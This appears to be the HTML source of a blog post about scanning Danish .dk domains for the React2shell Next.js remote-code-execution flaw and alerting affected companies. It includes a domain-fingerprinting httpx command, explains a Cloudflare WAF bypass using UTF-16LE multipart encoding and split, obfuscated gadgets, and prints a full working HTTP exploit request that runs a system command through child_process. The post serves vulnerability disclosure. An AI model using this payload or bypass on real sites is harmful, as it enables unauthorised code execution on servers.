@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en"
+  dir="ltr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+
+
+
+<link rel="icon" type="image/ico" href="http://localhost:1313//favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313//favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313//favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="192x192" href="http://localhost:1313//android-chrome-192x192.png">
+<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313//apple-touch-icon.png">
+
+<meta name="description" content=""/>
+
+
+
+<title>
+    
+    Scanning .dk domains for react2shell | 0xlime Blog
+    
+</title>
+
+<link rel="canonical" href="http://localhost:1313/posts/react2shelldk/"/>
+
+<meta property="og:url" content="http://localhost:1313/posts/react2shelldk/">
+  <meta property="og:site_name" content="0xlime Blog">
+  <meta property="og:title" content="Scanning .dk domains for react2shell">
+  <meta property="og:description" content="Yesterday — Sunday evening — was spent alerting Danish companies that they were vulnerable to React2shell (CVE-2025-55182 and CVE-2025-66478), a recently dropped CVSS 10.0 vulnerability affecting a large portion of websites on the internet, with observed active exploitation already in the wild (react2shell.com).
+What does this mean in practice? It means that if your webpage is vulnerable, then there is a decent chance that your site has been, or soon will be, compromised. I am not trying to paint a scary scenario for hype — the scripts to obtain remote code execution on a vulnerable site are already out there, and they are being used.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-09T00:00:00+00:00">
+    <meta property="article:tag" content="Bug Bounty">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/assets/combined.min.b47068eb723e0d6f9b88b80d7b53d1a25a5b0e45c3e147c9d878f4b83cc6bc80.css" media="all">
+
+
+
+
+
+</head>
+
+
+
+
+
+
+
+<body class="light">
+
+  <div class="content">
+    <header>
+      
+
+<div class="header">
+
+    
+
+    <h1 class="header-title">
+        <a href="http://localhost:1313/">0xlime Blog</a>
+    </h1>
+
+    <div class="flex">
+        
+
+        
+        
+      
+        <p class="small ">
+            <a href="/" >
+                /home
+            </a>
+        </p>
+        
+      
+        <p class="small ">
+            <a href="/posts" >
+                /posts
+            </a>
+        </p>
+        
+      
+        <p class="small ">
+            <a href="/presentations" >
+                /presentations
+            </a>
+        </p>
+        
+      
+        <p class="small ">
+            <a href="https://r4.dk" >
+                /about
+            </a>
+        </p>
+        
+        
+    </div>
+
+    
+
+</div>
+
+    </header>
+
+    <main class="main">
+      
+
+
+
+
+
+<div class="breadcrumbs">
+    
+    <a href="/">Home</a>
+    <span class="breadcrumbs-separator"> > </span>
+    
+    <a href="/posts/">Posts</a>
+    <span class="breadcrumbs-separator"> > </span>
+    
+    <a class="breadcrumbs-current" href="/posts/react2shelldk/">Scanning .dk domains for react2shell</a>
+</div>
+
+
+
+<div >
+
+  <div class="single-intro-container">
+
+    
+
+    <h1 class="single-title">Scanning .dk domains for react2shell</h1>
+    
+
+    
+
+    <p class="single-readtime">
+      
+      
+      
+      <time datetime="2025-12-09T00:00:00&#43;00:00">December 9, 2025</time>
+      
+
+      
+    </p>
+
+  </div>
+
+  
+
+  
+
+  
+
+  
+
+  <div class="single-content">
+    <p>Yesterday — Sunday evening — was spent alerting Danish companies that they were vulnerable to <strong>React2shell</strong> (<code>CVE-2025-55182</code> and <code>CVE-2025-66478</code>), a recently dropped CVSS 10.0 vulnerability affecting a large portion of websites on the internet, with observed active exploitation already in the wild (<a href="https://react2shell.com/">react2shell.com</a>).</p>
+<p>What does this mean in practice? It means that if your webpage is vulnerable, then there is a decent chance that your site has been, or soon will be, compromised. I am not trying to paint a scary scenario for hype — the scripts to obtain remote code execution on a vulnerable site are already out there, and they are being used.</p>
+<p>I have been talking a lot lately about the security of Danish companies and the struggles of getting in touch with them about security issues (see my <a href="/posts/securitytxt/">security.txt analysis</a> and the <a href="/posts/skat-upload/">SKAT path traversal post</a>). Yesterday was no different. I had scanned all <code>.dk</code> domains plus some extras and spent the whole evening alerting companies on their public contact mails, to security teams directly on LinkedIn, and in some cases on Facebook Messenger. The response was positive, so that was nice :-)</p>
+<h3 class="heading" id="what-is-react2shell">
+  What is React2shell?
+  <a class="anchor" href="#what-is-react2shell">#</a>
+</h3>
+<p>React2shell is the nickname for a vulnerability chain in Next.js&rsquo;s server actions that, in a fairly common configuration, allows an unauthenticated remote attacker to obtain <strong>remote code execution</strong> on the host. The two CVEs that make up the chain are tracked as <code>CVE-2025-55182</code> and <code>CVE-2025-66478</code>, and together they earned a CVSS 10.0 rating. There is a published advisory and a working PoC, and the fix has been out for a little while now — but as always, <em>patched upstream</em> is not the same as <em>patched on the site you actually visit</em>.</p>
+<p>its&hellip; bad. The kind of vulnerability you want to know about <em>before</em> the weekend, not during it.</p>
+<h3 class="heading" id="narrowing-down-which-danish-sites-are-even-nextjs">
+  Narrowing down which Danish sites are even Next.js
+  <a class="anchor" href="#narrowing-down-which-danish-sites-are-even-nextjs">#</a>
+</h3>
+<p>Before aggressively scanning all <code>.dk</code> domains I did a sweep of my ~1.3 million <code>.dk</code> domain list (the same unofficial list from <a href="https://wallnot.dk/dotdk/">wallnot.dk</a> that I used in my <code>security.txt</code> post) to identify servers running Next.js. <code>httpx</code> makes this kind of thing one command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>httpx -l dk_domains.txt -path / -follow-redirects -silent -no-color -mr &#34;(?i)_next&#34; -o dk_next_hits.txt
+</span></span></code></pre></div><p><code>-mr</code> matches the response body against the given regex, so any site shipping the standard Next.js <code>_next/...</code> asset paths in its HTML gets flagged. Next.js is fairly chatty about itself in headers and build IDs, so this narrows things down to a manageable candidate list quickly.</p>
+<h3 class="heading" id="building-the-scanner">
+  Building the scanner
+  <a class="anchor" href="#building-the-scanner">#</a>
+</h3>
+<p>For the actual vulnerability check I used <a href="https://github.com/assetnote/react2shell-scanner">Assetnote&rsquo;s react2shell-scanner</a> as the base, with a handful of changes layered on top. The general flow is two-stage:</p>
+<ol>
+<li>Fire a <em>safe</em> probe (no real RCE payload, just the marker request) against each candidate</li>
+<li>For anything that reflects the expected response, fire the actual payload to confirm</li>
+</ol>
+<p>Step 1 is a bit of a hassle since  <strong>Cloudflare ate the original payload alive</strong> on a meaningful chunk of the targets.</p>
+<h3 class="heading" id="bypassing-cloudflare">
+  Bypassing Cloudflare
+  <a class="anchor" href="#bypassing-cloudflare">#</a>
+</h3>
+<p>A lot of the affected sites sit behind Cloudflare&rsquo;s managed ruleset, which has a signature for the React2shell payload pattern. The vanilla scanner would get a clean <code>403</code> from Cloudflare on every Cloudflare-fronted site, which is useless for telling vulnerable apart from patched.</p>
+<p>The WAF bypass I built on top of the scanner was based on this great X post from <a href="https://x.com/phithon_xg/status/1997005756013728204">@phithon_xg</a>:</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="Cloudflare UTF-16LE WAF bypass post by phithon_xg" src="/posts/react2shelldk/waf-bypass-tweet.png" width="1510px" height="1210px">
+    </div>
+
+    
+</figure>
+</p>
+<p>The core trick is encoding parts of the multipart body as <strong>UTF-16LE</strong> instead of UTF-8. Cloudflare&rsquo;s signature engine reads multipart fields as UTF-8 by default, so if you set <code>charset=utf-16le</code> on the relevant parts, the engine sees byte-soup while the application sees a perfectly valid payload (because the app asks Node to decode it according to the declared charset). Beautiful.</p>
+<p>Adapting this into the Assetnote scanner ended up being a handful of focused changes:</p>
+<ul>
+<li><strong>The multipart payload is hand-built now</strong> (<code>scanner.py:101</code>). The original used <code>requests</code>&rsquo; built-in <code>files=</code> plumbing, which fights you on charsets. I rebuilt both the safe probe and the RCE payload as raw multipart bytes so I could attach <code>charset=utf-16le</code> to exactly the fields that needed it.</li>
+<li><strong>The exploit chain is split across multipart fields</strong> (<code>scanner.py:160</code>). The original PoC put the whole thing inline as <code>$1:constructor:constructor</code>-style references in a single JSON blob. Cloudflare&rsquo;s rule fires on that inline form. Instead, the JSON now references <code>$3</code>, and the constructor gadget lives in a separate UTF-16LE multipart part. Same effect, totally different bytes on the wire.</li>
+<li><strong>The command string is lightly obfuscated</strong> (<code>scanner.py:154</code>). Cloudflare flags the literal <code>execSync</code>, so the payload builds the function name at runtime as <code>&quot;ex&quot; + &quot;e&quot; + &quot;cSync&quot;</code>. Yes, it is that dumb. Yes, it works.</li>
+</ul>
+<p>The final payload looks like the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST / HTTP/2
+</span></span><span style="display:flex;"><span>Host: any-dk-host.dk
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Next-Action: x
+</span></span><span style="display:flex;"><span>X-Nextjs-Request-Id: b5dce965
+</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+</span></span><span style="display:flex;"><span>X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
+</span></span><span style="display:flex;"><span>Content-Length: 1315
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;0&#34;
+</span></span><span style="display:flex;"><span>Content-Type: text/plain; charset=utf-16le
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{\0&#34;\0t\0h\0e\0n\0&#34;\0:\0&#34;\0$\01\0:\0_\0_\0p\0r\0o\0t\0o\0_\0_\0:\0t\0h\0e\0n\0&#34;\0,\0&#34;\0s\0t\0a\0t\0u\0s\0&#34;\0:\0&#34;\0r\0e\0s\0o\0l\0v\0e\0d\0_\0m\0o\0d\0e\0l\0&#34;\0,\0&#34;\0r\0e\0a\0s\0o\0n\0&#34;\0:\0-\01\0,\0&#34;\0v\0a\0l\0u\0e\0&#34;\0:\0&#34;\0{\0\\0&#34;\0t\0h\0e\0n\0\\0&#34;\0:\0\\0&#34;\0$\0B\01\03\03\07\0\\0&#34;\0}\0&#34;\0,\0&#34;\0_\0r\0e\0s\0p\0o\0n\0s\0e\0&#34;\0:\0{\0&#34;\0_\0p\0r\0e\0f\0i\0x\0&#34;\0:\0&#34;\0v\0a\0r\0 \0r\0e\0s\0=\0p\0r\0o\0c\0e\0s\0s\0.\0m\0a\0i\0n\0M\0o\0d\0u\0l\0e\0.\0r\0e\0q\0u\0i\0r\0e\0(\0&#39;\0c\0h\0i\0l\0d\0_\0p\0r\0o\0c\0e\0s\0s\0&#39;\0)\0[\0&#39;\0e\0x\0&#39;\0+\0&#39;\0e\0&#39;\0+\0&#39;\0c\0S\0y\0n\0c\0&#39;\0]\0(\0&#39;\0u\0n\0a\0m\0e\0 \0-\0a\0&#39;\0,\0{\0e\0n\0c\0o\0d\0i\0n\0g\0:\0&#39;\0u\0t\0f\0-\08\0&#39;\0}\0)\0.\0t\0o\0S\0t\0r\0i\0n\0g\0(\0)\0.\0t\0r\0i\0m\0(\0)\0;\0;\0t\0h\0r\0o\0w\0 \0O\0b\0j\0e\0c\0t\0.\0a\0s\0s\0i\0g\0n\0(\0n\0e\0w\0 \0E\0r\0r\0o\0r\0(\0&#39;\0N\0E\0X\0T\0_\0R\0E\0D\0I\0R\0E\0C\0T\0&#39;\0)\0,\0{\0d\0i\0g\0e\0s\0t\0:\0`\0N\0E\0X\0T\0_\0R\0E\0D\0I\0R\0E\0C\0T\0;\0p\0u\0s\0h\0;\0/\0l\0o\0g\0i\0n\0?\0x\0=\0$\0{\0r\0e\0s\0}\0;\03\00\07\0;\0`\0}\0)\0;\0&#34;\0,\0&#34;\0_\0c\0h\0u\0n\0k\0s\0&#34;\0:\0&#34;\0$\0Q\02\0&#34;\0,\0&#34;\0_\0f\0o\0r\0m\0D\0a\0t\0a\0&#34;\0:\0{\0&#34;\0g\0e\0t\0&#34;\0:\0&#34;\0$\03\0&#34;\0}\0}\0}\0
+</span></span><span style="display:flex;"><span>------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;1&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#34;$@0&#34;
+</span></span><span style="display:flex;"><span>------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;2&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[]
+</span></span><span style="display:flex;"><span>------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;3&#34;
+</span></span><span style="display:flex;"><span>Content-Type: text/plain; charset=utf-16le
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#34;\0$\01\0:\0c\0o\0n\0s\0t\0r\0u\0c\0t\0o\0r\0:\0c\0o\0n\0s\0t\0r\0u\0c\0t\0o\0r\0&#34;\0
+</span></span><span style="display:flex;"><span>------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+</span></span></code></pre></div><p>Combined, these moves got me a clean reflection back from a meaningful fraction of the Cloudflare-fronted targets, which is what I needed in order to actually identify <em>vulnerable</em> vs. <em>patched-or-protected</em>.</p>
+<h3 class="heading" id="what-i-found">
+  What I found
+  <a class="anchor" href="#what-i-found">#</a>
+</h3>
+<p>After the full sweep, this is the rough picture (with company names redacted — the disclosure is the point, not the shaming):</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="Vulnerable .dk domains discovered by the scan" src="/posts/react2shelldk/vulnerabledkdomains.png" width="812px" height="832px">
+    </div>
+
+    
+</figure>
+</p>
+<p>I am not going to name names here. A few were companies I think most Danes would recognise. The rest were a long tail of smaller sites where the founder&rsquo;s personal LinkedIn turned out to be the fastest contact channel.</p>
+<h3 class="heading" id="alerting-companies">
+  Alerting companies
+  <a class="anchor" href="#alerting-companies">#</a>
+</h3>
+<p>This part was honestly more work than the technical bit. As I have written about before in my <code>security.txt</code> post: most Danish companies do not have a well-defined disclosure channel, so you end up doing detective work just to figure out <em>who to email</em> in the first place.</p>
+<p>For each vulnerable site I tried, in order:</p>
+<ol>
+<li><code>security.txt</code> at <code>/security.txt</code> and <code>/.well-known/security.txt</code></li>
+<li><code>security@</code>, <code>it-security@</code>, <code>disclosure@</code> mail aliases</li>
+<li>LinkedIn — looking for someone with &ldquo;Security&rdquo;, &ldquo;DevOps&rdquo; or &ldquo;CTO&rdquo; in their title at the company</li>
+<li>As a last resort, the company&rsquo;s public Facebook Messenger or generic contact form</li>
+</ol>
+<p>A surprising number of contacts came through LinkedIn within a couple of hours, with several people thanking me on Sunday evening and confirming a patch was being rolled out the same night. A few even chased me for the technical details so they could verify the fix, this is exactly the response you <em>want</em> to see. Hats off to those teams :-)</p>
+<p>A smaller number never responded, and a couple of contact forms returned generic <em>we will get back to you</em> autoreplies. Oh well..</p>
+<h3 class="heading" id="outro">
+  Outro
+  <a class="anchor" href="#outro">#</a>
+</h3>
+<p>If you are running Next.js: patch. If you are <em>operating</em> something on Next.js without knowing it: find out, then patch. The exploit is trivially weaponisable and is being used right now — this is not the kind of vulnerability you let sit over the weekend.</p>
+<p>And if you are a Danish company, please — please — add a <code>security.txt</code>. It is a 30-minute job and it makes the whole alerting flow above considerably less painful for everyone involved. Right now the path from <em>I found a critical vuln on your site</em> to <em>I have actually told the right person at your company</em> is way too long, way too often.</p>
+
+    
+  </div>
+
+  
+
+
+  
+
+
+  
+
+  
+  <div class="back-to-top">
+    <a href="#top">
+      back to top
+    </a>
+  </div>
+  
+
+</div>
+
+
+    </main>
+  </div>
+
+  <footer>
+    
+
+    
+    <p>Powered by
+        <a href="https://gohugo.io/">Hugo</a>
+        and
+        <a href="https://github.com/tomfran/typo">tomfran/typo</a>
+    </p>
+    
+    
+    
+
+
+  </footer>
+
+  
+
+</body>
+
+<script>
+
+  function isAuto() {
+    return document.body.classList.contains("auto");
+  }
+
+  function setTheme() {
+    if (!isAuto()) {
+      return
+    }
+
+    document.body.classList.remove("auto");
+    let cls = "light";
+    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+      cls = "dark";
+    }
+
+    document.body.classList.add(cls);
+  }
+
+  function invertBody() {
+    document.body.classList.toggle("dark");
+    document.body.classList.toggle("light");
+  }
+
+  if (isAuto()) {
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(invertBody);
+  }
+
+  setTheme();
+
+</script>
+
+<script defer src="/js/copy-code.js"></script>
+</html>
